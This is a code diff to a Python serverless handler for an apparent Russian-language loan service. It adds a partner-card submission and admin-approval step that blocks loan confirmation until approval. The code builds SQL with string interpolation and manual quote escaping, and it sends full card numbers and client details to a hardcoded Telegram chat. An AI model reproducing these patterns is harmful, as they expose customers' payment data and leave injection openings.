@@ -265,6 +265,19 @@ def force_account_phone(value: str, account_phone: str) -> str:
     return f"{account_phone}{sep}{bank}" if bank else account_phone
 
 
+def partner_card_blocked(cur, phone: str) -> bool:
+    """True, если у клиента заявка «займ с картой партнёра» и идентификация карты ещё не одобрена админом."""
+    cur.execute(
+        f"SELECT status, partner_card_status FROM {SCHEMA}.applications "
+        f"WHERE phone = '{phone.replace(chr(39), chr(39)*2)}' ORDER BY created_at DESC LIMIT 1"
+    )
+    r = cur.fetchone()
+    return bool(r and r[0] == "partner_card" and (r[1] or "none") != "approved")
+
+
+PARTNER_BLOCK_MSG = "Сначала отправьте данные карты партнёра на идентификацию и дождитесь одобрения"
+
+
 def mask_card(value: str) -> str:
     digits = "".join(ch for ch in value if ch.isdigit())
     if len(digits) >= 16:
@@ -332,6 +345,54 @@ def handler(event: dict, context) -> dict:
         cur.execute(f"UPDATE {SCHEMA}.saved_cards SET hidden = TRUE WHERE id = {card_id} AND phone = '{phone.replace(chr(39), chr(39)*2)}'")
         conn.commit()
         cur.close(); conn.close()
+        return {"statusCode": 200, "headers": CORS, "body": json.dumps({"ok": True})}
+
+    # --- КАРТА ПАРТНЁРА: отправить на идентификацию (POST sub=partner_card_submit) ---
+    if event.get("httpMethod") == "POST" and (event.get("queryStringParameters") or {}).get("sub") == "partner_card_submit":
+        raw_p = event.get("body") or "{}"
+        bp = json.loads(raw_p) if isinstance(raw_p, str) else raw_p
+        pc_number = str(bp.get("cardNumber") or "").strip()
+        pc_photo = str(bp.get("photoUrl") or "").strip()
+        pc_digits = "".join(ch for ch in pc_number if ch.isdigit())
+        if not (16 <= len(pc_digits) <= 19):
+            cur.close(); conn.close()
+            return {"statusCode": 400, "headers": CORS, "body": json.dumps({"error": "Введите номер карты партнёра (16–19 цифр)"}, ensure_ascii=False)}
+        if not pc_photo.startswith("https://"):
+            cur.close(); conn.close()
+            return {"statusCode": 400, "headers": CORS, "body": json.dumps({"error": "Прикрепите фото карты партнёра"}, ensure_ascii=False)}
+        ph_p = phone.replace("'", "''")
+        cur.execute(
+            f"SELECT id, full_name, partner_card_status FROM {SCHEMA}.applications "
+            f"WHERE phone = '{ph_p}' AND status = 'partner_card' ORDER BY created_at DESC LIMIT 1"
+        )
+        pa = cur.fetchone()
+        if not pa:
+            cur.close(); conn.close()
+            return {"statusCode": 404, "headers": CORS, "body": json.dumps({"error": "Заявка с картой партнёра не найдена"}, ensure_ascii=False)}
+        if (pa[2] or "none") == "approved":
+            cur.close(); conn.close()
+            return {"statusCode": 409, "headers": CORS, "body": json.dumps({"error": "Идентификация уже одобрена"}, ensure_ascii=False)}
+        cur.execute(
+            f"UPDATE {SCHEMA}.applications SET partner_card_number = '{pc_number[:64].replace(chr(39), chr(39)*2)}', "
+            f"partner_card_photo = '{pc_photo.replace(chr(39), chr(39)*2)}', partner_card_status = 'pending', "
+            f"partner_card_sent_at = NOW(), partner_card_reject_reason = NULL WHERE id = {int(pa[0])}"
+        )
+        conn.commit()
+        cur.close(); conn.close()
+        import urllib.request as _ur
+        tg_token_p = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+        if tg_token_p:
+            try:
+                _ur.urlopen(_ur.Request(
+                    f"https://api.telegram.org/bot{tg_token_p}/sendMessage",
+                    data=json.dumps({"chat_id": "8540431915", "parse_mode": "HTML", "text": (
+                        f"🪪 <b>Клиент отправил карту партнёра на идентификацию</b>\n\n"
+                        f"👤 <b>ФИО:</b> {pa[1] or phone}\n📞 <b>Телефон:</b> {phone}\n"
+                        f"💳 <b>Карта партнёра:</b> {pc_number}\n🔖 <b>Заявка №:</b> {pa[0]}\n\n"
+                        f"Откройте админку и одобрите или откажите в идентификации.")}).encode(),
+                    headers={"Content-Type": "application/json"}), timeout=5)
+            except Exception:
+                pass
         return {"statusCode": 200, "headers": CORS, "body": json.dumps({"ok": True})}
 
     # --- СОХРАНИТЬ НОМЕР КАРТЫ/СБП (PATCH) ---
@@ -407,6 +468,10 @@ def handler(event: dict, context) -> dict:
                     pass
             cur.close(); conn.close()
             return {"statusCode": 200, "headers": CORS, "body": json.dumps({"ok": True})}
+
+        if confirm and partner_card_blocked(cur, phone):
+            cur.close(); conn.close()
+            return {"statusCode": 403, "headers": CORS, "body": json.dumps({"error": PARTNER_BLOCK_MSG}, ensure_ascii=False)}
 
         if confirm:
             cur.execute(
@@ -1128,6 +1193,10 @@ def handler(event: dict, context) -> dict:
             cur.close(); conn.close()
             return {"statusCode": 400, "headers": CORS, "body": json.dumps({"error": "Не указан loanId"})}
 
+        if partner_card_blocked(cur, phone):
+            cur.close(); conn.close()
+            return {"statusCode": 403, "headers": CORS, "body": json.dumps({"error": PARTNER_BLOCK_MSG}, ensure_ascii=False)}
+
         cur.execute(
             f"SELECT id FROM {SCHEMA}.loans WHERE id = {loan_id} AND user_id = {user_id} AND signed = FALSE AND status = 'review'"
         )
@@ -1159,6 +1228,15 @@ def handler(event: dict, context) -> dict:
     )
     app_row = cur.fetchone()
     card_app_id = app_row[0] if app_row else None
+    partner_card_info = {"status": "none", "number": "", "photo": "", "rejectReason": ""}
+    if app_row:
+        cur.execute(
+            f"SELECT partner_card_status, partner_card_number, partner_card_photo, partner_card_reject_reason "
+            f"FROM {SCHEMA}.applications WHERE id = {int(app_row[0])}"
+        )
+        _pc = cur.fetchone()
+        if _pc:
+            partner_card_info = {"status": _pc[0] or "none", "number": _pc[1] or "", "photo": _pc[2] or "", "rejectReason": _pc[3] or ""}
     if app_row and not app_row[11]:
         cur.execute(
             f"SELECT id, virtual_card_number, virtual_card_expiry, virtual_card_cvv, virtual_card_holder, virtual_card_limit, "
@@ -1366,6 +1444,7 @@ def handler(event: dict, context) -> dict:
             "reapplyDaysLeft": reapply_days_left,
             "videoCallRequested": bool(app_row[35]) if app_row[35] is not None else False,
             "partnerCardUrl": app_row[37] or "",
+            "partnerCard": partner_card_info,
             "insuranceAmount": insurance_amount_app,
         }
         cur.execute(f"SELECT reg_address, living_address, work_address FROM {SCHEMA}.applications WHERE id = {int(app_row[0])}")
